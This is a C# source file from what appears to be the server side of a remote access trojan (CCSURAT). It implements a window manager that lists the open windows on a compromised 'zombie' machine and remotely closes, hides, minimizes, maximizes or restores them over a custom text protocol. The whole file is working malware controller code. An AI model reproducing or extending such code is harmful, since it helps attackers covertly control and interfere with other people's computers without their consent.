using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CCSURAT_Server.ControlForms
{
    public partial class WindowManager : Form
    {
        private Zombie zombie;
        private ListViewHitTestInfo selected;

        public WindowManager(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            this.Text = zombie.IP + " - " + zombie.computerName + " - Window Manager";
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GetWindows();
        }

        // Gets client's current open windows and places them into the listview
        private void GetWindows()
        {
            try
            {
                // Clear list and client's windows and request new window data.
                windowList.Items.Clear();
                zombie.windows = string.Empty;
                zombie.SendData("[[WINDOWS]][[/WINDOWS]]");
                while (zombie.windows == string.Empty)
                {
                    System.Threading.Thread.Sleep(1);
                    Application.DoEvents();
                }
                // When window data is received, check if there is any. If so, parse and add to window listview.
                if (!zombie.windows.Equals("[[NONE]]"))
                {
                    string[] windows = zombie.windows.Split(new string[] { "|&|" }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string w in windows)
                    {
                        string[] windowInfo = w.Split(new string[] { "|*|" }, StringSplitOptions.RemoveEmptyEntries);
                        ListViewItem windowItem = new ListViewItem(windowInfo[0]); // window handle
                        windowItem.SubItems.Add(windowInfo[1]); // window title
                        windowItem.SubItems.Add(windowInfo[2]); // process executable path
                        windowItem.SubItems.Add(windowInfo[3]); // visibility type (hidden/visible)
                        windowList.Items.Add(windowItem);
                    }
                }
            }
            catch (Exception ex)
            {
                zombie.mainForm.Log("Window manager error: " + ex.ToString());
            }
        }

        private void WindowManager_Shown(object sender, EventArgs e)
        {

            GetWindows();
        }

        private void windowList_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                windowControl.Show(windowList, e.Location);
                selected = windowList.HitTest(e.X, e.Y);
            }
        }

        // Handle Ctrl+A (select all)
        private void windowList_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.A && e.Control)
                foreach (ListViewItem item in windowList.Items)
                    item.Selected = true;
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelectedWindows("CLOSE");
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelectedWindows("HIDE");
        }

        private void maximizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelectedWindows("MAXIMIZE");
        }

        private void minimizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelectedWindows("MINIMIZE");
        }

        private void restoreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelectedWindows("RESTORE");
        }

        // Create a command with all the selected windows paired with the chosen window command.
        private void SendSelectedWindows(string command)
        {
            string windowCommandData = "[[WINDOW]]";
            foreach (ListViewItem w in windowList.SelectedItems)
                windowCommandData += w.Text + "|*|" + command + "|*|";
            windowCommandData += "[[/WINDOW]]";
            zombie.SendData(windowCommandData);
        }
    }
}
